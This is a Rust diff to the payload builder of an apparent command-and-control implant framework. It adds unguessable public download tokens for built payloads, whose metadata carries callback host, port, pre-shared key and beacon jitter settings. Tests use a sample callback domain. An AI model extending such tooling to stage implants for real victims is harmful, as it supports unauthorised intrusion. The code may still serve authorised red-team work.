@@ -48,6 +48,8 @@ pub struct PayloadMeta {
     pub jitter_ms: u64,
     #[serde(default)]
     pub target: String,
+    #[serde(default)]
+    pub public_id: String,
     pub size: u64,
     pub built_at: String,
 }
@@ -318,6 +320,7 @@ async fn do_build(req: &BuildRequest, name: &str, file: &str) -> Result<PayloadM
         interval_ms: req.interval_ms,
         jitter_ms: req.jitter_ms,
         target: req.target.clone(),
+        public_id: Uuid::new_v4().to_string(),
         size: std::fs::metadata(&dest).map(|m| m.len()).unwrap_or(0),
         built_at: chrono::Utc::now().to_rfc3339(),
     };
@@ -330,6 +333,10 @@ async fn do_build(req: &BuildRequest, name: &str, file: &str) -> Result<PayloadM
 
 pub fn list() -> Result<Vec<PayloadMeta>> {
     let dir = Path::new(PAYLOAD_DIR);
+    list_from_dir(dir)
+}
+
+fn list_from_dir(dir: &Path) -> Result<Vec<PayloadMeta>> {
     if !dir.exists() {
         return Ok(Vec::new());
     }
@@ -342,12 +349,16 @@ pub fn list() -> Result<Vec<PayloadMeta>> {
             continue;
         }
         let sidecar = dir.join(format!("{fname}.json"));
-        let meta = if sidecar.exists() {
+        let mut meta = if sidecar.exists() {
             serde_json::from_slice::<PayloadMeta>(&std::fs::read(&sidecar)?)
                 .unwrap_or_else(|_| fallback_meta(&fname, &path))
         } else {
             fallback_meta(&fname, &path)
         };
+        if Uuid::parse_str(&meta.public_id).is_err() {
+            meta.public_id = Uuid::new_v4().to_string();
+            std::fs::write(&sidecar, serde_json::to_vec_pretty(&meta)?)?;
+        }
         out.push(meta);
     }
     out.sort_by(|a, b| b.built_at.cmp(&a.built_at));
@@ -367,6 +378,7 @@ fn fallback_meta(fname: &str, path: &Path) -> PayloadMeta {
         interval_ms: 0,
         jitter_ms: 0,
         target: String::new(),
+        public_id: String::new(),
         size: std::fs::metadata(path).map(|m| m.len()).unwrap_or(0),
         built_at: chrono::Utc::now().to_rfc3339(),
     }
@@ -379,6 +391,35 @@ pub fn download_path(file: &str) -> Option<PathBuf> {
     } else {
         None
     }
+}
+
+/// Resolve an unguessable public download token to the artifact it names.
+/// The path comes from the directory entry, never from sidecar-controlled data.
+pub fn public_download(token: &str) -> Option<(PathBuf, String)> {
+    public_download_from_dir(Path::new(PAYLOAD_DIR), token)
+}
+
+fn public_download_from_dir(dir: &Path, token: &str) -> Option<(PathBuf, String)> {
+    let token = Uuid::parse_str(token).ok()?.to_string();
+    for entry in std::fs::read_dir(dir).ok()? {
+        let Ok(entry) = entry else { continue };
+        let path = entry.path();
+        if !path.is_file() || path.extension().is_some_and(|ext| ext == "json") {
+            continue;
+        }
+        let filename = entry.file_name().to_string_lossy().to_string();
+        let sidecar = dir.join(format!("{filename}.json"));
+        let Ok(bytes) = std::fs::read(sidecar) else {
+            continue;
+        };
+        let Ok(metadata) = serde_json::from_slice::<serde_json::Value>(&bytes) else {
+            continue;
+        };
+        if metadata.get("public_id").and_then(|id| id.as_str()) == Some(token.as_str()) {
+            return Some((path, filename));
+        }
+    }
+    None
 }
 
 /// Fresh random PSK for the build form default.
@@ -438,5 +479,59 @@ mod tests {
         assert_eq!(recent_errors()[0].0, "win-1.windows.amd64");
         clear_build_errors("win-1.windows.amd64");
         assert!(recent_errors().is_empty());
+    }
+
+    #[test]
+    fn legacy_payload_gets_one_persisted_public_uuid() {
+        let temp = tempfile::tempdir().unwrap();
+        let file = "legacy.linux.amd64";
+        std::fs::write(temp.path().join(file), b"payload").unwrap();
+        let sidecar = temp.path().join(format!("{file}.json"));
+        std::fs::write(
+            &sidecar,
+            serde_json::to_vec(&serde_json::json!({
+                "file": file,
+                "name": "legacy",
+                "os": "linux",
+                "arch": "amd64",
+                "protocol": "https",
+                "lhost": "gateofbabylon.space",
+                "lport": 443,
+                "psk": "test-only",
+                "interval_ms": 5000,
+                "jitter_ms": 1000,
+                "target": "x86_64-unknown-linux-musl",
+                "size": 7,
+                "built_at": "2026-09-10T00:00:00Z"
+            }))
+            .unwrap(),
+        )
+        .unwrap();
+
+        let first = list_from_dir(temp.path()).unwrap();
+        let public_id = first[0].public_id.clone();
+        assert!(Uuid::parse_str(&public_id).is_ok());
+        assert_eq!(list_from_dir(temp.path()).unwrap()[0].public_id, public_id);
+
+        let persisted: serde_json::Value =
+            serde_json::from_slice(&std::fs::read(sidecar).unwrap()).unwrap();
+        assert_eq!(persisted["public_id"], public_id);
+    }
+
+    #[test]
+    fn public_download_skips_unrelated_artifacts_without_metadata() {
+        let temp = tempfile::tempdir().unwrap();
+        std::fs::write(temp.path().join("orphan.bin"), b"orphan").unwrap();
+        let token = "550e8400-e29b-41d4-a716-446655440000";
+        let file = "wanted.bin";
+        std::fs::write(temp.path().join(file), b"wanted").unwrap();
+        std::fs::write(
+            temp.path().join(format!("{file}.json")),
+            serde_json::to_vec(&serde_json::json!({ "public_id": token })).unwrap(),
+        )
+        .unwrap();
+
+        let (_, filename) = public_download_from_dir(temp.path(), token).unwrap();
+        assert_eq!(filename, "wanted.bin");
     }
 }
